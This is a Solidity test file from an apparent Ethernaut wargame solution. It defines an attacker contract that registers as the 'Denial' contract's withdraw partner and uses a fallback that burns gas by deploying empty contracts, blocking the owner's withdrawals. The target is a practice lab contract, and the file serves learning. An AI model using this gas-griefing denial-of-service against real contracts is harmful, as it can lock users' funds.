// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Denial} from "../../src/ethernaut/20_Denial/Denial.sol";

contract Denial_Attacker {
	address player;
	Denial coreInst;
	
	constructor(Denial coreInst_) payable {
		player = msg.sender;
		coreInst = Denial(payable(coreInst_));
		coreInst.setWithdrawPartner(address(this));
	}
	
	// receive() external payable {}
	
	fallback() external payable {
		uint256 gasCurrent = gasleft();
		while(true) {
			if (gasCurrent - gasleft() > 1_000_000 * 0.9) {
				break;
			}
			
			new waste();
		}
		
		// assert(false);
	}
}

contract waste {}
